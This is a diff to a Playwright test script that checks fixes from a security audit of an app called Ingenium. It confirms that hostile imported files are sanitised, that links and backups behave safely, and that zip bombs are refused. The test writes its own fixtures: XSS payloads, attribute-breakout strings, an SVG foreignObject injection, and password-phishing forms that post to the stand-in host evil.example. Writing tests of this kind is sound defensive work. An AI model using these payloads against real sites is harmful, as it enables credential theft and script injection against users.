@@ -1,18 +1,24 @@
 // Ingenium 6.7 · the security audit's fixes, in Chromium. Each check shows the attack failing on the built page while
 // ordinary use still works.
-//   page-injection 0: a hostile .html imported into Tabula (a carried app at Ingenium's own origin) runs no code; its
-//     headings, bold, lists, tables, images and links still come through. A hostile paste into Scriba and Imago is cleaned.
+//   page-injection 0: a hostile .html imported into Tabula (a carried app at Ingenium's own origin) runs no code and keeps
+//     no form, password field, button, stylesheet or style that loads from another site, and no request leaves for that
+//     site; its headings, bold, lists, tables, images, links and plain colours still come through. The same for a hostile
+//     .docx (both of Tabula's readers), an Imago deck file and a Scriba notepad brought back by a restore. Inside a carried
+//     app, HTML from the clipboard is cleaned and no text-to-markup path runs code.
 //   page-injection 1: a link to another site does not navigate Ingenium's own window; it opens in a new window. A
 //     javascript: link runs nothing. The app's own hash links are left alone.
 //   page-injection 2 / secrets-crypto-data 1: a desk file brought in whose note carries markup is sanitised at restore; the
 //     restore preview says plainly what is replaced.
 //   secrets-crypto-data 0: a backup that changes a connection's address does not carry the device's key onto it; a backup
-//     that keeps the address does carry it.
+//     that keeps the address does carry it, also when only the chosen model or the GitHub repository differs.
 //   page-injection 4: stripTags reads search markup as words only (an image's onerror never runs).
-//   page-injection 3: the stage keys each page's store by its own identity, so two files of the same name do not share.
+//   page-injection 3: the stage keys a page's store by where it comes from. Through the real paths (a Code app's preview,
+//     a reply's Run, a file attached in a conversation, a changed file, Fabrica's run): a new version of the same page
+//     keeps its data, the same name in another conversation or source starts empty, no store piles up per version, and
+//     6.6's stores are taken over once by pages that were there before, never by a page written or attached later.
 //   secrets-crypto-data 3: a zip bomb is refused with a plain message; a large real export still imports.
 //   node rig/t_67_security.js http://127.0.0.1:8166/ingenium.html <out folder> [fixtures url, for the large-export check]
-//   The hostile .html and the zip bomb are made by the test itself, in <out folder>. The optional fixtures url points at a
+//   The hostile .html, .docx, deck and the zip bomb are made by the test itself, in <out folder>. The optional fixtures url points at a
 //   folder served with rig/import_fixtures.js output (chatgpt_big.zip), for the "a large real export still imports" check.
 const pw = require('/opt/node-tools/node_modules/playwright'); const fs = require('fs'); const path = require('path');
 const URL_ = process.argv[2], OUT = process.argv[3], FIXURL = process.argv[4] || null;
@@ -33,6 +39,10 @@ fs.writeFileSync(HOSTILE, [
   '<ul><li>First point</li><li>Second point</li></ul>',
   '<table border="1"><thead><tr><th>Name</th><th>Value</th></tr></thead><tbody><tr><td>Alpha</td><td>1</td></tr><tr><td>Beta</td><td>2</td></tr></tbody></table>',
   '<p><img src="https://example.org/pic.png" alt="a picture"></p>',
+  '<link rel="stylesheet" href="https://evil.example/sheet.css">',
+  '<div style="background:url(https://evil.example/bg.png)">styled from afar</div>',
+  '<p style="color:#225588">a plain colour</p>',
+  '<form action="https://evil.example/collect" method="post"><p>Please enter your password again</p><input name="pw" type="password"><button>Send</button></form>',
   '<p><img src="x" onerror="window.parent && (window.parent.__pwned=\'img-onerror\')"></p>',
   '<p onclick="window.parent && (window.parent.__pwned=\'onclick\')">click me</p>',
   '<a href="javascript:window.parent&&(window.parent.__pwned=\'js-url\')">bad link</a>',
@@ -48,9 +58,43 @@ const ZIPBOMB = path.join(OUT, 'zipbomb.zip');
   const cd = Buffer.concat([u32(0x02014b50), u16(20), u16(20), u16(0), u16(8), u16(0), u16(0), u32(0), u32(csize), u32(usize), u16(name.length), u16(0), u16(0), u16(0), u16(0), u32(0), u32(0), name]);
   const eocd = Buffer.concat([u32(0x06054b50), u16(0), u16(0), u16(1), u16(1), u32(cd.length), u32(lh.length), u16(0)]);
   fs.writeFileSync(ZIPBOMB, Buffer.concat([lh, cd, eocd])); })();
+// a zip written here (deflated entries, with their CRC), for the hostile .docx
+const zlib = require('zlib');
+const CRC_T = (() => { const t = new Uint32Array(256); for (let n = 0; n < 256; n++) { let c = n; for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1; t[n] = c >>> 0; } return t; })();
+const crc32 = b => { let c = 0xffffffff; for (let i = 0; i < b.length; i++) c = CRC_T[(c ^ b[i]) & 0xff] ^ (c >>> 8); return (c ^ 0xffffffff) >>> 0; };
+function makeZip(entries) { const u16 = v => { const b = Buffer.alloc(2); b.writeUInt16LE(v >>> 0, 0); return b; }, u32 = v => { const b = Buffer.alloc(4); b.writeUInt32LE(v >>> 0, 0); return b; };
+  const locals = [], cds = []; let off = 0;
+  for (const [n, text] of entries) { const name = Buffer.from(n), raw = Buffer.from(text, 'utf8'), comp = zlib.deflateRawSync(raw), crc = crc32(raw);
+    const lh = Buffer.concat([u32(0x04034b50), u16(20), u16(0), u16(8), u16(0), u16(0), u32(crc), u32(comp.length), u32(raw.length), u16(name.length), u16(0), name, comp]);
+    cds.push(Buffer.concat([u32(0x02014b50), u16(20), u16(20), u16(0), u16(8), u16(0), u16(0), u32(crc), u32(comp.length), u32(raw.length), u16(name.length), u16(0), u16(0), u16(0), u16(0), u32(0), u32(off), name]));
+    locals.push(lh); off += lh.length; }
+  const cd = Buffer.concat(cds), eocd = Buffer.concat([u32(0x06054b50), u16(0), u16(0), u16(entries.length), u16(entries.length), u32(cd.length), u32(off), u16(0)]);
+  return Buffer.concat([...locals, cd, eocd]); }
+const W_NS = 'http://schemas.openxmlformats.org/wordprocessingml/2006/main', R_NS = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships', HL = R_NS + '/hyperlink';
+const DOCX = path.join(OUT, 'hostile.docx');
+fs.writeFileSync(DOCX, makeZip([
+  ['[Content_Types].xml', '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>'],
+  ['_rels/.rels', '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="' + R_NS + '/officeDocument" Target="word/document.xml"/></Relationships>'],
+  ['word/_rels/document.xml.rels', '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rIdOk" Type="' + HL + '" Target="https://example.org/docx" TargetMode="External"/><Relationship Id="rIdJs" Type="' + HL + '" Target="javascript:window.top.__pwnedD=1" TargetMode="External"/></Relationships>'],
+  ['word/document.xml', '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:document xmlns:w="' + W_NS + '" xmlns:r="' + R_NS + '"><w:body>'
+    + '<w:p><w:r><w:rPr><w:b/></w:rPr><w:t>Docx bold line</w:t></w:r></w:p>'
+    + '<w:p><w:hyperlink r:id="rIdOk"><w:r><w:t>good link</w:t></w:r></w:hyperlink><w:hyperlink r:id="rIdJs"><w:r><w:t>bad link</w:t></w:r></w:hyperlink></w:p>'
+    + '<w:tbl><w:tblGrid><w:gridCol w:w="2000"/><w:gridCol w:w="2000"/></w:tblGrid><w:tr>'
+    // a cell shading that closes the style and writes a form; another that adds a style loading from another site
+    + '<w:tc><w:tcPr><w:shd w:fill="FF0000&quot;&gt;&lt;form action=&quot;https://evil.example/docx&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;password&quot; name=&quot;pw&quot;&gt;&lt;button&gt;Send&lt;/button&gt;&lt;/form&gt;&lt;img src=x onerror=&quot;window.top.__pwnedD=2&quot;&gt;&lt;span title=&quot;"/></w:tcPr><w:p><w:r><w:t>cell one</w:t></w:r></w:p></w:tc>'
+    + '<w:tc><w:tcPr><w:shd w:fill="00FF00;background-image:url(https://evil.example/docx-bg.png)"/></w:tcPr><w:p><w:r><w:t>cell two</w:t></w:r></w:p></w:tc>'
+    + '</w:tr></w:tbl><w:p><w:r><w:t>the end</w:t></w:r></w:p></w:body></w:document>']
+]));
+// an Imago deck whose slide text, text box, shape colour and background each try to bring something in
+const DECK = path.join(OUT, 'hostile-deck.json');
+fs.writeFileSync(DECK, JSON.stringify({ v: 1, title: 'Hostile deck', theme: 'ivory', current: 0, slides: [{ id: 's1', layout: 'titleContent', bg: 'url(https://evil.example/deck-bg.png)', notes: '',
+  f: { title: '<b>Deck title</b><img src=x onerror="window.top.__pwnedI=1"><form action="https://evil.example/deck"><input type="password" name="pw"></form>', body: 'A <i>plain</i> line' },
+  o: [{ id: 'o1', t: 'text', x: 10, y: 60, w: 40, h: 20, html: '<div style="background:url(https://evil.example/deck-box.png)">box text</div><b>bold box</b>' },
+      { id: 'o2', t: 'rect', x: 60, y: 60, w: 20, h: 20, fill: 'red"/><foreignObject width="100" height="100"><form xmlns="http://www.w3.org/1999/xhtml" action="https://evil.example/shape"><input type="password"/></form></foreignObject><rect fill="', stroke: 'none', sw: 0 }] }] }));
 
 async function boot(ctx) {
   const p = await ctx.newPage(); p.__errs = []; p.on('pageerror', e => p.__errs.push(e.message));
+  p.__evil = []; p.on('request', r => { if (/evil\.example/.test(r.url())) p.__evil.push(r.url()); });
   await p.route('**://evil.example/**', r => r.abort());
   await p.goto(URL_); await p.waitForFunction(() => window.__ingReady === true, null, { timeout: 180000 }); await p.waitForTimeout(800);
   await p.evaluate(() => { const b = [...document.querySelectorAll('button')].find(x => x.textContent.trim() === 'Enter' && x.offsetParent); if (b) b.click(); });
@@ -69,6 +113,7 @@ async function boot(ctx) {
     await p.waitForFunction(() => { const f = document.querySelector('#ing-desk iframe[data-app="tabula"]'); try { return !!(f.contentWindow && f.contentWindow.document.getElementById('openFile')); } catch (e) { return false; } }, null, { timeout: 30000 });
     await p.waitForTimeout(600);
     const fr = p.frameLocator('#ing-desk iframe[data-app="tabula"]');
+    p.__evil.length = 0;
     await fr.locator('#openFile').setInputFiles(HOSTILE);
     await p.waitForTimeout(1500);
     const r0 = await p.evaluate(() => { const f = document.querySelector('#ing-desk iframe[data-app="tabula"]'); const d = f.contentWindow.document; const ed = d.getElementById('editor');
@@ -78,10 +123,15 @@ async function boot(ctx) {
         li: ed.querySelectorAll('li').length, td: ed.querySelectorAll('td').length, safeImg: imgs.filter(s => /^https:/.test(s)).length,
         link: !!ed.querySelector('a[href^="https:"]'), badLink: !!ed.querySelector('a[href^="javascript:"]'),
         script: ed.querySelectorAll('script').length, iframe: ed.querySelectorAll('iframe').length,
-        onAttr: /\son[a-z]+=/i.test(html) }; });
+        onAttr: /\son[a-z]+=/i.test(html),
+        form: ed.querySelectorAll('form,input,button,select,textarea').length, sheet: ed.querySelectorAll('link,style').length,
+        loadingStyle: /url\s*\(/i.test(html), formWords: /enter your password again/.test(ed.textContent),
+        colour: !!ed.querySelector('p[style*="color"]') }; });
     ok(r0.pwned === undefined && r0.framePwned === undefined, 'page-injection 0: the imported document ran no code (no onerror, script, onclick, svg or javascript: fired)', r0);
     ok(r0.h1 && r0.b && r0.i && r0.u && r0.li === 2 && r0.td === 4 && r0.safeImg === 1 && r0.link, 'page-injection 0: its headings, bold, lists, table, image and safe link still came through', r0);
     ok(r0.script === 0 && r0.iframe === 0 && !r0.badLink && !r0.onAttr, 'page-injection 0: the script, iframe, javascript: link and every event attribute were dropped', r0);
+    ok(r0.form === 0 && r0.sheet === 0 && !r0.loadingStyle && r0.formWords && r0.colour, 'page-injection 0: the form, password field, button, stylesheet and style that loads from afar were dropped (the words and a plain colour kept)', r0);
+    ok(p.__evil.length === 0, 'page-injection 0: importing it sent no request to the other site', p.__evil);
     await p.evaluate(() => { const f = document.querySelector('#ing-desk iframe[data-app="tabula"]'); f.contentWindow.document.getElementById('editor').innerHTML = ''; });
 
     // inside a carried app's frame: HTML read from the clipboard is cleaned, and turning text into markup cannot run code
@@ -98,6 +148,53 @@ async function boot(ctx) {
       box.remove(); plain.remove(); return out;
     });
     ok(r0b.pwned === undefined && !/onerror/i.test(r0b.got) && !/onerror/i.test(r0b.boxHtml) && !/onerror/i.test(r0b.plainHtml) && /<b>/.test(r0b.got), 'page-injection 0: inside a carried app, clipboard HTML is cleaned and no text-to-markup path runs code', r0b);
+
+    // a hostile .docx through both of Tabula's readers: the file field (it builds nodes) and the ribbon's reader (it writes markup)
+    const docxCheck = () => p.evaluate(() => { const f = document.querySelector('#ing-desk iframe[data-app="tabula"]'); const ed = f.contentWindow.document.getElementById('editor'); const html = ed.innerHTML;
+      return { pwned: window.__pwnedD, bold: /Docx bold line/.test(ed.textContent) && !!ed.querySelector('b,strong'), cells: /cell one/.test(ed.textContent) && /cell two/.test(ed.textContent),
+        form: ed.querySelectorAll('form,input,button').length, loadingStyle: /url\s*\(/i.test(html), onAttr: /\son[a-z]+=/i.test(html), jsLink: !!ed.querySelector('a[href^="javascript:"]'),
+        goodLink: !!ed.querySelector('a[href="https://example.org/docx"]'), table: !!ed.querySelector('table') }; });
+    await p.evaluate(() => { window.__pwnedD = undefined; const f = document.querySelector('#ing-desk iframe[data-app="tabula"]'); f.contentWindow.document.getElementById('editor').innerHTML = ''; });
+    p.__evil.length = 0;
+    await fr.locator('#openFile').setInputFiles(DOCX); await p.waitForTimeout(1800);
+    const rd1 = await docxCheck();
+    ok(rd1.pwned === undefined && rd1.form === 0 && !rd1.loadingStyle && !rd1.onAttr && !rd1.jsLink && p.__evil.length === 0, 'page-injection 0: a hostile .docx opened from the file field keeps no form, script, javascript: link or style that loads from afar, and sends nothing out', { rd1, evil: p.__evil });
+    ok(rd1.bold && rd1.cells && rd1.table && rd1.goodLink, 'page-injection 0: its bold, its table and its safe link still come through', rd1);
+    await p.evaluate(() => { const f = document.querySelector('#ing-desk iframe[data-app="tabula"]'); f.contentWindow.document.getElementById('editor').innerHTML = ''; });
+    p.__evil.length = 0;
+    const docxBytes = [...fs.readFileSync(DOCX)];
+    await p.evaluate((bytes) => { const f = document.querySelector('#ing-desk iframe[data-app="tabula"]'); const w = f.contentWindow; w.__cdOpenFile(new w.File([new Uint8Array(bytes)], 'hostile.docx', { type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document' })); }, docxBytes);
+    await p.waitForTimeout(1800);
+    const rd2 = await docxCheck();
+    ok(rd2.pwned === undefined && rd2.form === 0 && !rd2.loadingStyle && !rd2.onAttr && p.__evil.length === 0, 'page-injection 0: the same .docx through the ribbon\'s reader: its shading cannot write a form or a style that loads from afar, and nothing goes out', { rd2, evil: p.__evil });
+    ok(rd2.bold && rd2.cells && rd2.table, 'page-injection 0: and its bold and table still come through', rd2);
+    await p.evaluate(() => { const f = document.querySelector('#ing-desk iframe[data-app="tabula"]'); f.contentWindow.document.getElementById('editor').innerHTML = ''; });
+
+    // a hostile Imago deck file: each slide is drawn through the sanitiser
+    await p.evaluate(() => { window.__pwnedI = undefined; go('slides'); });
+    await p.waitForSelector('#ing-desk iframe[data-app="slides"]', { timeout: 30000 });
+    await p.waitForFunction(() => { const f = document.querySelector('#ing-desk iframe[data-app="slides"]'); try { return !!(f.contentWindow && f.contentWindow.document.getElementById('jsonFile') && f.contentWindow.document.getElementById('slide')); } catch (e) { return false; } }, null, { timeout: 30000 });
+    await p.waitForTimeout(600);
+    p.__evil.length = 0;
+    await p.frameLocator('#ing-desk iframe[data-app="slides"]').locator('#jsonFile').setInputFiles(DECK); await p.waitForTimeout(1500);
+    const ri = await p.evaluate(() => { const f = document.querySelector('#ing-desk iframe[data-app="slides"]'); const d = f.contentWindow.document, sl = d.getElementById('slide'); const html = sl.innerHTML;
+      return { pwned: window.__pwnedI, title: /Deck title/.test(sl.textContent) && !!sl.querySelector('b'), box: /box text/.test(sl.textContent), italic: !!sl.querySelector('i'),
+        form: sl.querySelectorAll('form,input,foreignObject,foreignobject').length, loadingStyle: /url\s*\(/i.test(html), onAttr: /\son[a-z]+=/i.test(html),
+        bg: sl.style.getPropertyValue('--s-bg'), shapes: sl.querySelectorAll('svg rect').length }; });
+    ok(ri.pwned === undefined && ri.form === 0 && !ri.loadingStyle && !ri.onAttr && !/url/i.test(ri.bg) && p.__evil.length === 0, 'page-injection 0: a hostile Imago deck keeps no form, script, password field or background that loads from afar, and sends nothing out', { ri, evil: p.__evil });
+    ok(ri.title && ri.box && ri.italic && ri.shapes >= 1, 'page-injection 0: its title in bold, its text box, its italics and its shape are still drawn', ri);
+
+    // Scriba's notepad as a restore would bring it back (the small store), then opened
+    p.__evil.length = 0;
+    await p.evaluate(() => { window.__pwnedS = undefined; localStorage.setItem('scriba_pad', '<p><b>Kept note</b></p><div style="background:url(https://evil.example/pad.png)">pad words</div><form action="https://evil.example/pad"><input type="password"></form><img src=x onerror="window.top.__pwnedS=1">'); go('scriba'); });
+    await p.waitForSelector('#ing-desk iframe[data-app="scriba"]', { timeout: 30000 });
+    await p.waitForFunction(() => { const f = document.querySelector('#ing-desk iframe[data-app="scriba"]'); try { return !!(f.contentWindow && f.contentWindow.document.getElementById('pad')); } catch (e) { return false; } }, null, { timeout: 30000 });
+    await p.waitForTimeout(1200);
+    const rs = await p.evaluate(() => { const f = document.querySelector('#ing-desk iframe[data-app="scriba"]'); const pad = f.contentWindow.document.getElementById('pad'); const html = pad.innerHTML;
+      return { pwned: window.__pwnedS, kept: /Kept note/.test(pad.textContent) && !!pad.querySelector('b'), words: /pad words/.test(pad.textContent), form: pad.querySelectorAll('form,input').length, loadingStyle: /url\s*\(/i.test(html) }; });
+    ok(rs.pwned === undefined && rs.form === 0 && !rs.loadingStyle && rs.kept && rs.words && p.__evil.length === 0, 'page-injection 0: Scriba\'s notepad brought back by a restore keeps its words and bold, and no form, script or style that loads from afar', { rs, evil: p.__evil });
+    await p.evaluate(() => { try { localStorage.removeItem('scriba_pad'); } catch (e) {} go('tabula'); });
+    await p.waitForTimeout(400);
 
     // ---------------- page-injection 1: a link to another site opens in a new window, not Ingenium's own ----------------
     const r1 = await p.evaluate(() => { window.__pwned1 = undefined;
@@ -146,23 +243,97 @@ async function boot(ctx) {
       return { cloudKey: state.cloud && state.cloud.key };
     });
     ok(r2b.cloudKey === 'SK-DEVICE-SECRET', 'secrets-crypto-data 0: a backup that keeps the same address does carry the device key (normal use)', r2b);
+    // a backup that differs from this device only in the chosen model, or the GitHub repository, still carries the keys
+    const r2c = await p.evaluate(async () => {
+      state.cloud = { provider: 'anthropic', base: 'https://api.anthropic.com/v1', key: 'SK-DEVICE', model: 'model-a', on: true };
+      state.github = { api: 'https://api.github.com', token: 'GH-DEVICE', owner: 'me', repo: 'first' }; saveState();
+      const desk = { chats: [{ id: 'c3', title: 'model only', messages: [] }], appName: 'Ingenium', notes: [], models: [], theme: 'day', reminders: [], parked: [], build: 1,
+        cloud: { provider: 'anthropic', base: 'https://api.anthropic.com/v1', key: '', model: 'model-b', on: true }, github: { api: 'https://api.github.com', token: '', owner: 'me', repo: 'second' } };
+      const file = new File([JSON.stringify(desk)], 'model-only.json', { type: 'application/json' });
+      const b = await IngBackup.open(file); const d = await IngBackup.describe(b, 'replace', false);
+      const saysKey = d.lines.some(l => /different address|left empty|not moved/i.test(l));
+      await IngBackup.apply(b, { mode: 'replace', reload: false });
+      return { key: state.cloud && state.cloud.key, model: state.cloud && state.cloud.model, token: state.github && state.github.token, repo: state.github && state.github.repo, saysKey };
+    });
+    ok(r2c.key === 'SK-DEVICE' && r2c.model === 'model-b' && r2c.token === 'GH-DEVICE' && r2c.repo === 'second' && !r2c.saysKey, 'secrets-crypto-data 0: a backup that changes only the model or the GitHub repository carries the keys, and the preview says nothing about a new address', r2c);
 
     // ---------------- page-injection 4: stripTags reads markup as words ----------------
     const r4 = await p.evaluate(() => { window.__pwned4 = undefined; const out = stripTags('<img src=x onerror="window.__pwned4=1">Result <b>snippet</b> text'); return { out, pwned: window.__pwned4 }; });
     await p.waitForTimeout(100);
     ok(r4.pwned === undefined && /Result/.test(r4.out) && !/</.test(r4.out), 'page-injection 4: stripTags reads search markup as words only (no onerror runs)', r4);
 
-    // ---------------- page-injection 3: the stage keys each page's store by its own identity ----------------
-    const r3 = await p.evaluate(() => {
-      const a = csStoreKey({ kind: 'file', name: 'index.html', html: '<h1>App A</h1>' });
-      const b = csStoreKey({ kind: 'file', name: 'index.html', html: '<h1>App B</h1>' });
-      const same = csStoreKey({ kind: 'file', name: 'index.html', html: '<h1>App A</h1>' });
-      const ref1 = csStoreKey({ kind: 'file', name: 'index.html', ref: 'big_abc1234', html: 'x' });
-      const ref2 = csStoreKey({ kind: 'file', name: 'index.html', ref: 'big_zzz9999', html: 'x' });
-      const rep = csStoreKey({ kind: 'reply', name: 'page', msg: { id: 'm42' }, html: 'x' });
-      return { a, b, same, differ: a !== b, stable: a === same, refDiffer: ref1 !== ref2, reply: rep };
-    });
-    ok(r3.differ && r3.stable && r3.refDiffer && /^msg:m42/.test(r3.reply), 'page-injection 3: two files of the same name get different stores; the same page keeps its store; stored pages and replies key by their own id', r3);
+    // ---------------- page-injection 3: the stage keys a page's store by where it comes from ----------------
+    // a page that tells what it finds in its store and, the first time, keeps a word of its own there
+    const PROBE = (title, label) => '<!doctype html><html><head><title>' + title + '</title></head><body><p>' + label + '</p><script>' +
+      'var seen=localStorage.getItem("saved");console.log("seen:"+(seen||"none"));if(!seen)localStorage.setItem("saved","from-' + label + '");<\/script></body></html>';
+    await p.evaluate(() => { go('chat'); window.__seeds = []; const o = csStoreLoad; csStoreLoad = function (k) { return o.apply(this, arguments).then(function (sd) { window.__seeds.push({ k: k, saved: (sd && sd.saved) || null }); return sd; }); }; });
+    await p.waitForTimeout(400);
+    const lastSeed = () => p.evaluate(() => window.__seeds[window.__seeds.length - 1] || null);
+    const nStores = () => p.evaluate(() => Object.keys(state.stageStores || {}).length);
+    const settle = () => p.waitForTimeout(1600);
+    // a chat made and shown as the person would switch to it
+    const toChat = (id, title, msgs) => p.evaluate(({ id, title, msgs }) => { state.chats = state.chats || []; if (!state.chats.some(c => c.id === id)) state.chats.push({ id, title, messages: [] });
+      const c = state.chats.find(x => x.id === id); msgs.forEach(m => c.messages.push(m)); state.activeChat = id; csCur = null; csStoreCur = null; renderChat(); return true; }, { id, title, msgs });
+    const runReply = (id, i) => p.evaluate(({ id, i }) => { const c = state.chats.find(x => x.id === id), m = c.messages[i]; csShow(csFromReply(m, chatArtifactOf(m.text)), { user: true }); return csStoreKey(csCur); }, { id, i });
+    const fence = h => '```html\n' + h + '\n```';
+    const t0 = Date.now(), cA = 'c' + t0.toString(36) + 'sa', cB = 'c' + t0.toString(36) + 'sb';
+
+    // a reply's Run, then a new version in the same conversation, then the same title in another conversation
+    await toChat(cA, 'Stage A', [{ role: 'bot', text: fence(PROBE('Store probe', 'A1')), done: Date.now() }]);
+    const kA1 = await runReply(cA, 0); await settle(); const sA1 = await lastSeed();
+    const n1 = await nStores();
+    await toChat(cA, 'Stage A', [{ role: 'bot', text: fence(PROBE('Store probe', 'A2')), done: Date.now() }]);
+    const kA2 = await runReply(cA, 1); await settle(); const sA2 = await lastSeed();
+    const n2 = await nStores();
+    await toChat(cB, 'Stage B', [{ role: 'bot', text: fence(PROBE('Store probe', 'B1')), done: Date.now() }]);
+    const kB1 = await runReply(cB, 0); await settle(); const sB1 = await lastSeed();
+    ok(sA1 && sA1.saved === null && kA2 === kA1 && sA2 && sA2.saved === 'from-A1' && n2 === n1, 'page-injection 3: a new version of a reply\'s page in the same conversation keeps what the first stored (no new store)', { kA1, kA2, sA1, sA2, n1, n2 });
+    ok(kB1 !== kA1 && sB1 && sB1.saved === null, 'page-injection 3: a page with the same title in another conversation cannot read it', { kA1, kB1, sB1 });
+
+    // a file attached in a conversation, and the same file name attached in another one
+    const attach = (name, html) => p.evaluate(({ name, html }) => { stageText(name, html, false); const f = stagedFiles[stagedFiles.length - 1]; csOpenFile(f); return true; }, { name, html });
+    await attach('index.html', PROBE('Attached', 'F1')); await settle(); const sF1 = await lastSeed();
+    const kF1 = await p.evaluate(() => csStoreKey(csCur));
+    await toChat(cA, 'Stage A', []);
+    await attach('index.html', PROBE('Attached', 'F2')); await settle(); const sF2 = await lastSeed();
+    const kF2 = await p.evaluate(() => csStoreKey(csCur));
+    // and the changed version of that file in the same conversation (a reply's edit card opens it)
+    const kE = await p.evaluate(async (html) => { const ref = IngBig.newId(); await IngBig.put(ref, html); edOpen({ kind: 'page', ref: ref, file: 'index.html' }); return ref; }, PROBE('Attached', 'E1'));
+    await settle(); const sE = await lastSeed(); const kE1 = await p.evaluate(() => csStoreKey(csCur));
+    ok(kF1 !== kF2 && sF2 && sF2.saved === null, 'page-injection 3: a downloaded index.html attached in another conversation does not get the first one\'s data', { kF1, kF2, sF2 });
+    ok(kE1 === kF2 && sE && sE.saved === 'from-F2', 'page-injection 3: the changed version of an attached file, in the same conversation, keeps its data', { kE1, kF2, sE });
+
+    // a Code app's preview: the app, edited, keeps its data; a file of the same name elsewhere cannot reach it
+    const code = await p.evaluate(async (v1) => { const pr = await ccMakeProject('Store probe app', [{ name: 'index.html', text: v1 }], 'index.html'); ccShowPreview(pr); return pr.id; }, PROBE('Code app', 'C1'));
+    await settle(); const sC1 = await lastSeed(); const kC1 = await p.evaluate(() => csStoreKey(csCur)); const nC1 = await nStores();
+    await p.evaluate(async ({ id, v2 }) => { const pr = state.projects.find(x => x.id === id); await ccPut(pr.files[0], v2); ccShowPreview(pr); }, { id: code, v2: PROBE('Code app', 'C2') });
+    await settle(); const sC2 = await lastSeed(); const kC2 = await p.evaluate(() => csStoreKey(csCur)); const nC2 = await nStores();
+    ok(sC1 && sC1.saved === null && kC2 === kC1 && sC2 && sC2.saved === 'from-C1' && nC2 === nC1 && /^code:/.test(kC1), 'page-injection 3: a Code app, edited, keeps what it stored, under one store', { kC1, kC2, sC1, sC2, nC1, nC2 });
+    ok(kC1 !== kF1 && kC1 !== kF2, 'page-injection 3: and an attached file called index.html cannot reach the Code app\'s index.html', { kC1, kF1, kF2 });
+
+    // Fabrica's run (it names no source yet): the same app, a new version, keeps its data as in 6.6
+    await p.evaluate((h) => csShow({ kind: 'file', html: h, name: 'my_app.html' }, { user: true }), PROBE('Fabrica app', 'P1')); await settle();
+    const kP1 = await p.evaluate(() => csStoreKey(csCur));
+    await p.evaluate((h) => csShow({ kind: 'file', html: h, name: 'my_app.html' }, { user: true }), PROBE('Fabrica app', 'P2')); await settle(); const sP2 = await lastSeed();
+    ok(kP1 === 'file:my_app.html' && sP2 && sP2.saved === 'from-P1', 'page-injection 3: Fabrica\'s run of a new version keeps its data (unchanged from 6.6)', { kP1, sP2 });
+
+    // what 6.6 kept: taken over once by a page that was there before, never by one written or attached later
+    const cL = 'c' + (t0 - 86400000).toString(36) + 'sl', cN = 'c' + t0.toString(36) + 'sn';
+    await p.evaluate(async () => { const id = IngBig.newId(); await IngBig.put(id, JSON.stringify({ saved: 'legacy-66' })); state.stageStores['page:Legacy probe'] = id;
+      const id2 = IngBig.newId(); await IngBig.put(id2, JSON.stringify({ saved: 'legacy-file-66' })); state.stageStores['file:legacy.html'] = id2; saveState(); });
+    const since = await p.evaluate(() => +localStorage.getItem('ing_stage_keys_at'));
+    await toChat(cL, 'Before', [{ role: 'bot', text: fence(PROBE('Legacy probe', 'L1')), done: since - 3600000 }]);
+    await runReply(cL, 0); await settle(); const sL = await lastSeed();
+    await toChat(cN, 'After', [{ role: 'bot', text: fence(PROBE('Legacy probe', 'N1')), done: Date.now() }]);
+    await runReply(cN, 0); await settle(); const sN = await lastSeed();
+    await attach('legacy.html', PROBE('Attached legacy', 'AL')); await settle(); const sAL = await lastSeed();
+    ok(since > 0 && sL && sL.saved === 'legacy-66', 'page-injection 3: a reply written before this version takes over what 6.6 kept for it', { since, sL });
+    ok(sN && sN.saved === null && sAL && sAL.saved === null, 'page-injection 3: a reply written later, or a file attached later, with the same name, does not', { sN, sAL });
+    // a Code app made before this version takes over its file's 6.6 store; one made later does not
+    const legacyCode = async (made, label) => { await p.evaluate(async ({ made, v }) => { const pr = await ccMakeProject('Legacy app ' + made, [{ name: 'legacy.html', text: v }], 'legacy.html'); pr.made = made; saveState(); ccShowPreview(pr); }, { made, v: PROBE('Legacy code', label) }); await settle(); return lastSeed(); };
+    const sCL = await legacyCode(since - 3600000, 'CL'), sCN = await legacyCode(Date.now(), 'CN');
+    ok(sCL && sCL.saved === 'legacy-file-66' && sCN && sCN.saved !== 'legacy-file-66', 'page-injection 3: a Code app made before this version takes over what 6.6 kept for its file; one made later does not', { sCL, sCN });
+    await p.evaluate(() => { try { csOpen(false, true); } catch (e) {} });
 
     // ---------------- secrets-crypto-data 3: a zip bomb is refused; a real export imports ----------------
     const zipBomb = fs.readFileSync(ZIPBOMB);
